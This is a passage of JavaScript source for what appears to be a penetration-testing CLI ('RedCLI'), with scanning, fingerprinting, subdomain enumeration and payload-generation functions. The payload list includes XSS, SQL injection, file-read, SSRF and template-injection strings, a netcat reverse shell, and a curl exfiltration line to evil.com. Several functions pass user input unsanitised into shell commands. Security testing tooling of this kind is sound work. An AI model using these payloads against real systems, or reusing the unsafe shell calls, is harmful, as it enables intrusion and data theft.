      return { error: 'nmap is not installed. Use install_tool to install it.', hint: 'install_tool({ tool: "nmap" })' };
    }
    return { error: `Port scan failed: ${err.message}` };
  }
}

async function executeDnsLookup(input) {
  const { domain, record_type = 'ANY' } = input;
  if (!domain) return { error: 'Domain is required' };

  try {
    const recordTypes = record_type === 'ANY' ? ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME'] : [record_type];
    const results = {};

    for (const rtype of recordTypes) {
      try {
        const output = execSync(
          process.platform === 'win32'
            ? `nslookup -type=${rtype} ${domain} 2>&1`
            : `dig ${domain} ${rtype} +short 2>&1`,
          { encoding: 'utf-8', timeout: 15000 }
        );
        const trimmed = output.trim();
        if (trimmed && !trimmed.includes('server can') && !trimmed.includes('***')) {
          results[rtype] = trimmed.split('\n').slice(0, 10);
        }
      } catch {}
    }

    if (Object.keys(results).length === 0) {
      // Fallback to nslookup
      try {
        const output = execSync(`nslookup ${domain} 2>&1`, { encoding: 'utf-8', timeout: 10000 });
        return { domain, output: output.slice(0, 2000) };
      } catch {}
      return { domain, error: `No DNS records found for ${domain}` };
    }

    return { domain, records: results };
  } catch (err) {
    return { error: `DNS lookup failed: ${err.message}` };
  }
}

async function executeCveSearch(input) {
  const { component, version = '' } = input;
  if (!component) return { error: 'Component name is required' };

  try {
    const cveLookup = new CVELookup();
    const results = await cveLookup.lookup(component, version);

    if (!results || results.length === 0) {
      return { component, version, cves: [], message: `No CVEs found for ${component} ${version}` };
    }

    return {
      component,
      version,
      cves: results.slice(0, 15).map(cve => ({
        id: cve.id || 'N/A',
        severity: cve.severity || 'UNKNOWN',
        cvss: cve.cvss || 'N/A',
        description: cve.description ? cve.description.slice(0, 300) : 'No description',
        references: cve.references ? cve.references.slice(0, 3) : []
      })),
      total: results.length
    };
  } catch (err) {
    return { error: `CVE search failed: ${err.message}` };
  }
}

function executePayloadGen(input) {
  const { vuln_type, context = '', count = 5 } = input;
  if (!vuln_type) return { error: 'Vulnerability type is required (xss, sqli, lfi, ssrf, cmdi, ssti)' };

  try {
    const allPayloads = generateDefaultPayloads(vuln_type, count);
    const payloads = allPayloads.slice(0, count);

    return {
      vuln_type,
      payloads,
      count: payloads.length,
      warning: 'Use these payloads only on authorized targets'
    };
  } catch (err) {
    return { error: `Payload generation failed: ${err.message}` };
  }
}

function generateDefaultPayloads(vulnType, count) {
  const payloads = {
    xss: [
      '<script>alert(1)</script>',
      '"><img src=x onerror=alert(1)>',
      "'-alert(1)-'",
      '<svg onload=alert(1)>',
      'javascript:alert(1)',
      '<img src=x onerror=alert(document.cookie)>',
      '<input onfocus=alert(1) autofocus>',
      '"><svg onload=alert(1)>',
      "';alert(1);//",
      '<details x= ontoggle=alert(1)>'
    ],
    sqli: [
      "' OR '1'='1",
      "' UNION SELECT 1--",
      "1' ORDER BY 1--",
      "' AND 1=1--",
      "1' UNION SELECT @@version--",
      "' OR 1=1--",
      "admin'--",
      "1' AND SLEEP(5)--",
      "' UNION SELECT table_name,column_name FROM information_schema.columns--",
      "1' UNION SELECT NULL,NULL,NULL--"
    ],
    lfi: [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '../../../etc/shadow',
      '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '....//....//....//etc/passwd',
      '../../../proc/self/environ',
      '..\\..\\..\\boot.ini',
      '../../../etc/hosts',
      'php://filter/convert.base64-encode/resource=index.php',
      '../../../var/log/apache2/access.log'
    ],
    ssrf: [
      'http://127.0.0.1:8080',
      'http://169.254.169.254/latest/meta-data/',
      'http://localhost:22',
      'http://0.0.0.0:80',
      'file:///etc/passwd',
      'http://[::1]:22',
      'http://10.0.0.1:22',
      'http://172.16.0.1:443',
      'http://192.168.1.1:80',
      'gopher://localhost:6379/_'
    ],
    cmdi: [
      '; ls',
      '| whoami',
      '&& id',
      '`cat /etc/passwd`',
      '| cat /etc/hosts',
      ';id;',
      '| nc -e /bin/sh 127.0.0.1 4444',
      '$(cat /etc/passwd)',
      '& ping -c 10 127.0.0.1 &',
      '| curl http://evil.com/exfil?data=$(whoami)'
    ],
    ssti: [
      '{{7*7}}',
      '${7*7}',
      '<%= 7*7 %>',
      '{{config}}',
      '#{7*7}',
      '*{7*7}',
      '{{7*\'7\'}}',
      '<%= system("id") %>',
      '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
      '${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}'
    ]
  };

  return payloads[vulnType.toLowerCase()] || [`${vulnType}://test-payload`];
}

async function executeFingerprint(input) {
  const { url, follow_redirects = true } = input;
  if (!url) return { error: 'URL is required' };

  try {
    const redirectFlag = follow_redirects ? '-L' : '';
    const curlCmd = `curl -s ${redirectFlag} -i -k --max-time 15 "${url}" 2>&1`;
    const response = execSync(curlCmd, { encoding: 'utf-8', timeout: 20000 });

    const headerEnd = response.indexOf('\r\n\r\n');
    const headers = headerEnd >= 0 ? response.slice(0, headerEnd) : response;
    const body = headerEnd >= 0 ? response.slice(headerEnd + 4) : '';

    const tech = [];
    const headerLines = headers.split('\n');

    // Server header
    const server = headerLines.find(l => /^server:/i.test(l));
    if (server) tech.push({ tech: server.split(':')[1]?.trim(), source: 'Server header' });

    // X-Powered-By
    const poweredBy = headerLines.find(l => /^x-powered-by:/i.test(l));
    if (poweredBy) tech.push({ tech: poweredBy.split(':')[1]?.trim(), source: 'X-Powered-By' });

    // Set-Cookie analysis
    const cookies = headerLines.filter(l => /^set-cookie:/i.test(l));
    if (cookies.some(c => c.includes('PHPSESSID'))) tech.push({ tech: 'PHP', source: 'Session cookie' });
    if (cookies.some(c => c.includes('JSESSIONID'))) tech.push({ tech: 'Java/JSP', source: 'Session cookie' });
    if (cookies.some(c => c.includes('ASPSESSIONID'))) tech.push({ tech: 'ASP/.NET', source: 'Session cookie' });

    // Body markers
    if (body.includes('wp-content')) tech.push({ tech: 'WordPress', source: 'Body marker' });
    if (body.includes('Drupal.settings')) tech.push({ tech: 'Drupal', source: 'Body marker' });
    if (body.includes('Joomla')) tech.push({ tech: 'Joomla', source: 'Body marker' });
    if (body.includes('nginx')) tech.push({ tech: 'nginx', source: 'Body marker' });

    // Common framework + version patterns
    const versionPatterns = [
      { pattern: /WordPress\s+v?([\d.]+)/i, tech: 'WordPress version' },
      { pattern: /Drupal\s+([\d.]+)/i, tech: 'Drupal version' },
      { pattern: /jQuery\s+v?([\d.]+)/i, tech: 'jQuery version' },
      { pattern: /Bootstrap\s+v?([\d.]+)/i, tech: 'Bootstrap version' },
      { pattern: /React/ig, tech: 'React' },
      { pattern: /Angular/ig, tech: 'Angular' },
      { pattern: /Vue\./ig, tech: 'Vue.js' },
      { pattern: /Laravel/ig, tech: 'Laravel' },
      { pattern: /Django/ig, tech: 'Django' },
      { pattern: /Flask/ig, tech: 'Flask' },
      { pattern: /Express/ig, tech: 'Express.js' }
    ];

    for (const { pattern, tech: techName } of versionPatterns) {
      const match = body.match(pattern);
      if (match) {
        const version = match[1] ? ` (${match[1]})` : '';
        if (!tech.some(t => t.tech === techName + version)) {
          tech.push({ tech: techName + version, source: 'Body pattern' });
        }
      }
    }

    return {
      url,
      status: headerLines[0] || '',
      headers: headerLines.slice(1, 20),
      technologies: tech,
      raw: headers.slice(0, 2000)
    };
  } catch (err) {
    if (err.message.includes('curl')) {
      return { error: 'curl is not installed. Use install_tool to install it.', hint: 'install_tool({ tool: "curl" })' };
    }
    return { error: `Fingerprint failed: ${err.message}` };
  }
}

async function executeSubdomainEnum(input) {
  const { domain, wordlist = 'common' } = input;
  if (!domain) return { error: 'Domain is required' };

  try {
    const subdomains = [];

    if (wordlist === 'common') {
      const common = ['www', 'mail', 'admin', 'api', 'blog', 'dev', 'test', 'stage', 'beta', 'app',
        'cdn', 'static', 'assets', 'media', 'img', 'docs', 'wiki', 'forum', 'support', 'help',
        'shop', 'store', 'portal', 'login', 'auth', 'sso', 'webmail', 'vpn', 'remote', 'git',
        'jenkins', 'jira', 'confluence', 'grafana', 'prometheus', 'kibana', 'elastic', 'splunk',
        'db', 'database', 'mysql', 'redis', 'mq', 'rabbitmq', 'kafka', 'ns1', 'ns2', 'ns3',
        'mx1', 'mx2', 'smtp', 'imap', 'pop3', 'calendar', 'meet', 'chat', 'status', 'monitor',
        'backup', 'mon', 'ops', 'prod', 'staging', 'demo', 'sandbox', 'internal', 'corp',
        'employee', 'partner', 'portal', 'erp', 'crm', 'hr', 'payroll', 'analytics', 'reports'];

      for (const sub of common) {
        const fqdn = `${sub}.${domain}`;
        try {
          execSync(
            process.platform === 'win32'
              ? `nslookup ${fqdn} 2>&1`
              : `dig ${fqdn} +short 2>&1`,
            { encoding: 'utf-8', timeout: 3000, stdio: 'pipe' }
          );
          subdomains.push(fqdn);
        } catch {}
      }
    } else {
      // Use subfinder if available for larger wordlists
      try {
        const output = execSync(`subfinder -d ${domain} -silent -timeout 5 2>&1`, { encoding: 'utf-8', timeout: 30000 });
        subdomains.push(...output.trim().split('\n').filter(Boolean));
      } catch {
        return { domain, error: 'subfinder not installed. Install with: install_tool({ tool: "subfinder" })', subdomains: [] };
      }
    }

    return {
      domain,
      found: subdomains.length,
      subdomains: subdomains.slice(0, 50),
      note: subdomains.length > 50 ? `(showing first 50 of ${subdomains.length})` : ''
    };
  } catch (err) {
    return { error: `Subdomain enumeration failed: ${err.message}` };
  }
}

async function executeWebSearch(input) {
  const { query, max_results = 5 } = input;
  if (!query) return { error: 'Query is required' };

  try {
    const url = `https://html.duckduckgo.com/html/?q=${encodeURIComponent(query)}`;
    const response = await fetch(url, {
      headers: { 'User-Agent': 'Mozilla/5.0 (compatible; RedCLI/0.3)' }
    });
    const html = await response.text();

    const results = [];
    const linkRegex = /<a[^>]*class="result__a"[^>]*href="([^"]*)"[^>]*>([\s\S]*?)<\/a>/gi;
    const snippetRegex = /<a[^>]*class="result__snippet"[^>]*>([\s\S]*?)<\/a>/gi;

    const links = [];
    let m;
    while ((m = linkRegex.exec(html)) !== null && links.length < max_results) {
      links.push({ url: m[1], title: m[2].replace(/<[^>]*>/g, '').trim() });
    }

    const snippets = [];
    while ((m = snippetRegex.exec(html)) !== null && snippets.length < max_results) {
      snippets.push(m[1].replace(/<[^>]*>/g, '').trim());
    }

    for (let i = 0; i < links.length; i++) {
      results.push({
        title: links[i].title,
        url: links[i].url,
        snippet: snippets[i] || ''
      });
    }

    if (results.length === 0) {
      return { results: [], message: 'No results found' };
    }
    return { results };
  } catch (err) {
    return { error: `Search failed: ${err.message}` };
  }
}

async function executeWebFetch(input) {
  const { url, max_length = 8000 } = input;
  if (!url) return { error: 'URL is required' };

  if (url.includes('localhost') || url.includes('127.0.0.1')) {
    return { error: 'Requests to localhost are blocked by default' };
  }

  try {
    const response = await fetch(url, {
      headers: { 'User-Agent': 'Mozilla/5.0 (compatible; RedCLI/0.3)' }
    });

    if (!response.ok) {
      return { error: `HTTP ${response.status}: ${response.statusText}` };
    }

    const html = await response.text();

    const text = html
      .replace(/<script[^>]*>[\s\S]*?<\/script>/gi, '')
      .replace(/<style[^>]*>[\s\S]*?<\/style>/gi, '')
      .replace(/<nav[^>]*>[\s\S]*?<\/nav>/gi, '')
      .replace(/<footer[^>]*>[\s\S]*?<\/footer>/gi, '')
      .replace(/<header[^>]*>[\s\S]*?<\/header>/gi, '')
      .replace(/<[^>]+>/g, ' ')
      .replace(/&[a-z]+;/g, ' ')
      .replace(/\s+/g, ' ')
      .trim();

    const truncated = text.length > max_length
      ? text.slice(0, max_length) + '\n... (truncated)'
      : text;

    return {
      url,
      status: response.status,
      content: truncated,
      length: text.length
    };
  } catch (err) {
    return { error: `Failed to fetch ${url}: ${err.message}` };
  }
}
